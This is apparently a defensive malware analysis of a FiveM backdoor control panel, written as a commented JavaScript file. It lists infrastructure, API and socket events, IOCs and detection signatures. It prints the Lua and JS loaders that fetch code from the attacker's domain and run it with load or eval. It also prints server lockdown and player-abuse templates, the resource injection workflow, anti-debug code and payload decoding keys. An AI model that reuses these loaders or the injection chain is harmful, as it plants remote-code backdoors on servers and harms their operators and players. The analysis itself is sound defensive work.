// ============================================================================
//
//  GFX PANEL — 100% DEOBFUSCATION
//  All 8 files, all code, all APIs, all attack templates
//
//  VERDICT: CONFIRMED MALWARE — FiveM backdoor C2 panel
//  Same attacker as Blum Panel (UAB Esnet, Vilnius, Lithuania)
//
//  FILES:
//    gfx_panel.html           2,497 bytes   Plaintext — anti-debug SPA shell
//    gfx_bundle.js          749,436 bytes   Minified React — FULLY EXTRACTED
//    gfx_style.css           76,540 bytes   Tailwind CSS (no code)
//    gfx_heartbeat_payload   61,248 bytes   Encrypted Lua
//    gfx_register_payload    61,813 bytes   Encrypted Lua
//    gfx_test_payload        65,263 bytes   Encrypted Lua
//
// ============================================================================


// ============================================================================
// INFRASTRUCTURE
// ============================================================================

const INFRA = {
    ip:           "185.80.130.168",
    port_http:    80,
    port_api:     3000,
    port_ssh:     22,
    domains:      ["gfxpanel.org", "kutingplays.com"],
    registrar:    "Namecheap",
    registered:   "Feb 7 2026",
    discord:      "discord.gg/cwd5kHwq6v",
    backend_path: "/root/local/gfx/backend/",
    builder:      "GPT Engineer",
    builder_token:"eSi92A9tMBTQWYu6OPvMFhyFiy72",
    favicon:      "https://storage.googleapis.com/gpt-engineer-file-uploads/eSi92A9tMBTQWYu6OPvMFhyFiy72/uploads/1770591906101-gfx_-_Copy.png",
};

// BLUM PANEL CONNECTION:
//   Blum:  185.80.128.35  (UAB Esnet, Vilnius, Lithuania)
//   GFX:   185.80.130.168 (UAB Esnet, Vilnius, Lithuania)
//   Same datacenter. Same attacker. Different product.


// ============================================================================
// gfx_panel.html — ANTI-DEBUG SPA SHELL (3 layers)
// ============================================================================

// Layer 1: Block right-click
document.addEventListener('contextmenu', function(e) { e.preventDefault(); });

// Layer 2: Block devtools shortcuts
document.addEventListener('keydown', function(e) {
    if (e.key === 'F12') { e.preventDefault(); return false; }
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && 'IJCijc'.includes(e.key)) { e.preventDefault(); return false; }
    if ((e.ctrlKey || e.metaKey) && 'Uu'.includes(e.key)) { e.preventDefault(); return false; }
});

// Layer 3: Debugger detection + infinite trap
(function() {
    setInterval(function() {
        var start = performance.now();
        debugger;
        var end_time = performance.now();
        if (end_time - start > 100) {
            while(true) { debugger; }
        }
    }, 1000);
})();


// ============================================================================
// AUTHENTICATION SYSTEM
// ============================================================================

// Discord OAuth flow:
// GET ${API_BASE}/api/discord-auth?action=login&redirect=${encodeURIComponent(url)}
// -> Discord OAuth -> /auth/callback -> JWT issued -> stored in localStorage

const auth = {
    login:      "GET /api/discord-auth?action=login&redirect=<url>",
    callback:   "GET /auth/callback",
    me:         "GET /auth/me",
    storage:    "localStorage.getItem('auth_token')",
    header:     "Authorization: Bearer <jwt>",
};

// Socket.IO authentication:
const socket = io("https://gfxpanel.org", {
    auth: { type: "dashboard", token: localStorage.getItem("auth_token") },
    transports: ["websocket", "polling"],
    reconnection: true,
    reconnectionAttempts: 10,
    reconnectionDelay: 1000,
});


// ============================================================================
// REACT ROUTES (all pages)
// ============================================================================

const routes = {
    "/login":              "Discord OAuth login page",
    "/auth/callback":      "OAuth return handler",
    "/pending-approval":   "Waiting for admin to approve account",
    "/suspended":          "Account suspended page",
    "/dashboard":          "Main dashboard — server list + stats",
    "/servers":            "All connected servers",
    "/server/:id":         "Individual server — console, players, resources, scripts",
    "/settings":           "User settings — profile, webhook, LOADER CODE display",
    "/owner":              "Admin panel — users, subscriptions, system payloads",
    "/autoloader":         "Resource injection tool — backdoor ZIP files",
    "/script-loader":      "Script/payload manager — saved attack scripts",
    "/multi-executor":     "Execute code on multiple servers simultaneously",
    "/leaderboard":        "User rankings by server count",
    "/discord":            "Discord invite redirect",
    "/:endpoint":          "PAYLOAD DELIVERY — browser gets cfx.re redirect, FiveM gets Lua",
    // /:endpoint behavior:
    //   Browser visit -> window.location.href = "https://portal.cfx.re" (camouflage)
    //   FiveM PerformHttpRequest -> Express backend serves Lua backdoor payload
};


// ============================================================================
// COMPLETE API MAP (37 endpoints extracted from bundle)
// ============================================================================

const API = {
    // === AUTH ===
    "GET  /auth/me":                              "Get current user profile",
    "GET  /auth/callback":                         "Discord OAuth callback",

    // === PROFILE ===
    "GET  /profile/settings":                      "Get user settings (webhook, domain, endpoint)",
    "POST /profile/endpoint":                      "Set user's payload endpoint path",
    "PUT  /profile/username":                       "Update username",
    "PUT  /profile/avatar":                         "Update avatar URL",

    // === SERVERS ===
    "GET  /servers":                               "List user's connected servers",
    "GET  /servers/:id":                           "Get server details",
    "GET  /servers/:id/console":                   "Get console output",
    "GET  /servers/:id/players":                   "List connected players",
    "GET  /servers/:id/resources":                 "List server resources",
    "GET  /servers/:id/scripts":                   "List saved scripts for server",
    "POST /servers/:id/scripts":                   "Save new script for server",
    "DELETE /servers/:id":                          "Remove server",

    // === SCRIPTS ===
    "PUT  /scripts/:id":                           "Update saved script",
    "DELETE /scripts/:id":                          "Delete saved script",

    // === EXECUTION ===
    "POST /execute-script":                        "Execute saved script on server",
    "GET  /execute-script/status/:id":             "Check execution status",

    // === RESOURCE INJECTION ===
    "POST http://185.80.130.168:3000/api/inject-resource": "Upload ZIP -> inject backdoor -> return weaponized ZIP",

    // === WEBHOOK ===
    "POST /webhook":                               "Send Discord webhook notification",
    "POST /sendWebhooks":                          "Relay webhooks (rate limited, public)",

    // === CONFIG ===
    "GET  /config/discord-invite":                 "Get Discord invite URL",

    // === LEADERBOARD ===
    "GET  /leaderboard":                           "Top users by server count",

    // === PAYLOAD DELIVERY (no auth) ===
    "GET  /heartbeat":                             "61KB encrypted Lua payload (internal)",
    "GET  /register":                              "61KB encrypted Lua payload (internal)",
    "GET  /test":                                  "65KB encrypted Lua payload (internal)",
    "GET  /:endpoint":                             "User-specific Lua payload (per-user path)",
    "GET  /:endpointjj":                           "User-specific JS payload (endpoint + 'jj' suffix)",

    // === ADMIN ONLY ===
    "GET    /admin/users":                         "List all users",
    "GET    /admin/users/:id/servers":             "List user's servers",
    "GET    /admin/check-endpoint/:path":          "Check if endpoint path available",
    "GET    /admin/scripts":                       "List system payloads",
    "POST   /admin/scripts":                       "Create system payload { name, code, type }",
    "PUT    /admin/users/:id/approve":             "Approve user + assign endpoint + optional domain",
    "PUT    /admin/users/:id/reject":              "Reject user (deletes account)",
    "PUT    /admin/users/:id/role":                "Set role: user | admin | owner",
    "PUT    /admin/users/:id/subscription":        "Set tier: Free | Trial | Monthly | Lifetime",
    "PUT    /admin/users/:id/suspend":             "Suspend/unsuspend user",
    "PUT    /admin/users/:id/server-visibility":   "Toggle all-server access",
    "DELETE /admin/users/:id":                      "Delete user + transfer endpoint servers",
};


// ============================================================================
// SOCKET.IO PROTOCOL (full event map)
// ============================================================================

const SOCKET_EMIT = {  // Panel -> Backend
    "execute":          "{ server_id, code, execution_type, script_id?, args? }",
    "console:list":     "{ serverId }  — request console history",
    "resources:list":   "{ serverId }  — list server resources",
    "resource:download":"{ serverId, resourceName } — STEAL resource files",
    "server:get":       "{ serverId }  — get server details",
    "servers:list":     "list user's servers",
    "servers:list:all": "list ALL servers (admin only)",
    "watch:server":     "subscribe to server events",
    "unwatch:server":   "unsubscribe from server events",
};

const SOCKET_ON = {  // Backend -> Panel
    "execute:result":   "code execution output",
    "console:log":      "real-time console line",
    "console:logs":     "console history batch",
    "resource:download":"base64 ZIP of stolen resource files",
    "resources:changed":"resource list changed",
    "server:status":    "server online/offline status",
    "servers:update":   "server list update",
    "server:removed":   "server disconnected",
};


// ============================================================================
// INFECTION CHAIN — LOADER CODE (extracted from Settings page)
// ============================================================================

// === LUA LOADER (shown to user, injected into victim resources) ===
// URL format: https://${domain || gfxpanel.org}/${user_endpoint}
// PerformHttpRequest('https://gfxpanel.org/${endpoint}', function(e, d)
//     pcall(function() assert(load(d))() end)
// end)

// === JS LOADER (endpoint URL + "jj" suffix for JS version) ===
// URL format: https://${domain || gfxpanel.org}/${user_endpoint}jj
// https.get('https://gfxpanel.org/${endpoint}jj', r => {
//     let d = '';
//     r.on('data', c => d += c);
//     r.on('end', () => eval(d));
// });

// === RESOURCE INJECTION (autoloader) ===
// 1. User uploads clean .zip FiveM resource to panel
// 2. Selects loader type: "server" | "client" | "both"
// 3. Panel POSTs to http://185.80.130.168:3000/api/inject-resource
//    FormData: { file: <zip>, type: <loaderType> }
// 4. Backend injects loader code into resource files + modifies fxmanifest
// 5. Returns weaponized ZIP: "${name}_injected.zip"
// 6. User distributes infected resource -> victim installs -> loader phones home


// ============================================================================
// CODE EXECUTION SYSTEM
// ============================================================================

// Execute via Socket.IO:
// socket.emit("execute", {
//     server_id: targetServerId,
//     code: luaOrJsCode,
//     execution_type: "server",   // "server" = Lua | "console" = JS
//     script_id: savedScriptId,   // optional: run saved payload by ID
//     args: scriptArguments,       // optional: payload arguments
// });

const SCRIPT_TYPES = {
    "lua_server":  "Lua executed on server side",
    "lua_client":  "Lua executed on client side",
    "lua_both":    "Lua with --[[SERVER]] and --[[CLIENT]] sections",
    "js_server":   "JavaScript executed in server console",
    "javascript":  "JavaScript (alias)",
    "console":     "Console command execution",
};

// Dual-execution wrapper (lua_both type):
// --[[SERVER]]
// ${serverSideCode}
// --[[/SERVER]]
// --[[CLIENT]]
// ${clientSideCode}
// --[[/CLIENT]]

// Multi-executor: select multiple servers -> execute same code on all at once


// ============================================================================
// PLAYER MANIPULATION — ALL ATTACK TEMPLATES
// ============================================================================

// KICK:      DropPlayer(${player_id}, "${reason}")
// FAKE BAN:  DropPlayer(${player_id}, "^1[BANNED]^0 ${banMessage || 'You have been permanently banned.'}")
// KILL:      SetEntityHealth(GetPlayerPed(${player_id}), 0)
// HEAL:      SetEntityHealth(ped, 200) + ResurrectPed(ped)
// LAUNCH:    SetEntityCoords(ped, x, y, z + 50.0) — teleport 50m up
// EXPLODE:   AddExplosion(coords, 1, 10.0, true, false, 1.0)
// RAGDOLL:   SetPedToRagdoll(ped, 5000, 5000, 0)
// FREEZE:    FreezeEntityPosition(ped, toggle)
// VEHICLE:   CreateVehicle(model) + TaskWarpPedIntoVehicle
// SET JOB:   TriggerEvent('esx:setJob', player_id, jobName, jobGrade)
// ANNOUNCE:  TriggerClientEvent('txcl:showAnnouncement', -1, msg, "gfxpanel.org/discord")


// ============================================================================
// SERVER LOCKDOWN (kick all + block new connections)
// ============================================================================

// local LOCK_REASON = "Gfx Panel - Join Discord gfxpanel.org/discord"
// local lockdownEnabled = true
//
// CreateThread(function()
//     for _, playerId in ipairs(GetPlayers()) do
//         DropPlayer(playerId, LOCK_REASON)
//     end
// end)
//
// AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)
//     if not lockdownEnabled then return end
//     deferrals.defer()
//     Wait(0)
//     deferrals.done(LOCK_REASON)
// end)


// ============================================================================
// RESOURCE MANAGEMENT (stop/start/restart/steal)
// ============================================================================

// StopResource("${resourceName}")
// StartResource("${resourceName}")
// Restart: StopResource("${name}") Citizen.SetTimeout(function() StartResource("${name}") end, 500)
//
// Resource theft (download entire resource as ZIP):
// socket.emit("resource:download", { serverId, resourceName })
// -> backend reads all files -> returns { files: [{ name, content (base64) }] }
// -> frontend creates ZIP using JSZip -> triggers browser download


// ============================================================================
// LINUX PRIVILEGE ESCALATION (from Owner panel)
// ============================================================================

const LINUX_ACTIONS = {
    "Create User":     "Creates Linux system user with optional sudo privileges",
    "Change Password": "Resets an existing user's password",
    "Add Sudo":        "Adds user to sudoers group, granting full admin access",
};
// Warning shown: "Sudo accounts have full control. Only create for trusted individuals."


// ============================================================================
// SUBSCRIPTION / USER MANAGEMENT
// ============================================================================

const USER_SYSTEM = {
    tiers:     ["Free", "Trial", "Monthly", "Lifetime"],
    roles:     ["user", "admin", "owner"],
    statuses:  ["pending", "approved", "rejected", "suspended"],
    // Workflow:
    // 1. Register via Discord OAuth -> status = "pending"
    // 2. Admin approves -> assigns endpoint path (e.g., /bek)
    // 3. Optional: assign custom domain
    // 4. Payload URL: https://${domain || 'gfxpanel.org'}/${endpoint}
    // 5. Admin can: approve, reject, suspend, change role/tier, delete
    // 6. On delete: endpoint's servers transfer to deleting admin
};


// ============================================================================
// LUA PAYLOADS — ENCRYPTION ANALYSIS
// ============================================================================
//
// Three payloads captured from public endpoints (no auth):
//   GET /heartbeat  -> 61,248 bytes
//   GET /register   -> 61,813 bytes
//   GET /test       -> 65,263 bytes
//
// OBFUSCATION: Triple-layer XOR + index shuffle
//
//   DECODED KEYS:
//   heartbeat: key1="b5474433c910d007"         key2="82da2f90f77085e32575c5be"
//   register:  key1="14a655004d7073ba33"        key2="5e0f7b6ece5f23ef705b7080d18eb64df9dfca8"
//   test:      key1="457173aadf760c15df46b844e54cb" key2="47c208e7f7479dd5a90803aa027eeda"
//
//   DECODE CHAIN:
//   1. Concatenate small arrays -> 6417-6818 byte main buffer
//   2. XOR main buffer with key2 (cycling)
//   3. Shuffle via index array: output[index[i]+1] = xored[i]
//   4. XOR shuffled buffer with key1 (cycling)
//   5. string.char() each byte -> table.concat() -> feed to load()
//
//   RESULT: 6.4-6.8KB blob starting with '$' (0x24) — NOT valid Lua
//   Requires additional runtime key from backend for final decryption
//
//   Likely payload functions:
//     /heartbeat -> Keepalive: sends server info to C2 periodically
//     /register  -> Registration: sends server details, player list, resources
//     /test      -> Validation: confirms infection is working


// ============================================================================
// COMPLETE IOC LIST
// ============================================================================

const IOC = {
    c2_ip:     "185.80.130.168",
    c2_port:   3000,
    domains:   ["gfxpanel.org", "kutingplays.com"],

    payload_urls: [
        "GET https://gfxpanel.org/heartbeat",
        "GET https://gfxpanel.org/register",
        "GET https://gfxpanel.org/test",
        "GET https://gfxpanel.org/${user_endpoint}",
        "GET https://gfxpanel.org/${user_endpoint}jj",
    ],

    api_urls: [
        "POST http://185.80.130.168:3000/api/inject-resource",
        "POST https://gfxpanel.org/sendWebhooks",
    ],

    discord:           "discord.gg/cwd5kHwq6v",
    gpt_engineer_token:"eSi92A9tMBTQWYu6OPvMFhyFiy72",

    detection_signatures: [
        "HTTP GET to gfxpanel.org/heartbeat or /register or /test",
        "Socket.IO connections to 185.80.130.168:3000",
        "Lua files with 140+ numeric arrays + double XOR + load() pattern",
        "Kick message: 'Gfx Panel - Join Discord gfxpanel.org/discord'",
        "TriggerClientEvent('txcl:showAnnouncement', -1, *, 'gfxpanel.org/discord')",
        "Files named *_injected.zip from the autoloader",
        "PerformHttpRequest to gfxpanel.org or kutingplays.com endpoints",
    ],
};


// ============================================================================
// GFX vs BLUM COMPARISON
// ============================================================================
//
//  | Feature                | Blum Panel              | GFX Panel              |
//  |------------------------|-------------------------|------------------------|
//  | C2 IP                  | 185.80.128.35           | 185.80.130.168         |
//  | Datacenter             | UAB Esnet, Vilnius      | UAB Esnet, Vilnius     |
//  | Frontend               | React 1.97MB            | React 749KB (Vite)     |
//  | Auth                   | Discord ID whitelist    | Discord OAuth + JWT    |
//  | Socket.IO events       | 75+                     | ~20                    |
//  | Resource infection     | Self-replicating worm   | Manual (autoloader)    |
//  | Player manipulation    | 12+ actions             | 10 actions             |
//  | txAdmin exploitation   | Yes (credential theft)  | No                     |
//  | WebRTC screen capture  | Yes                     | No                     |
//  | Linux privesc          | No                      | Yes (sudo management)  |
//  | Subscription model     | No (free/hardcoded)     | Yes (Trial/Monthly)    |
//  | Anti-debug             | None                    | F12 block + debugger   |
//  | Built from             | Stolen Cipher Panel     | GPT Engineer           |
//  | Crypto wallets         | In frontend             | None                   |
//
// ============================================================================
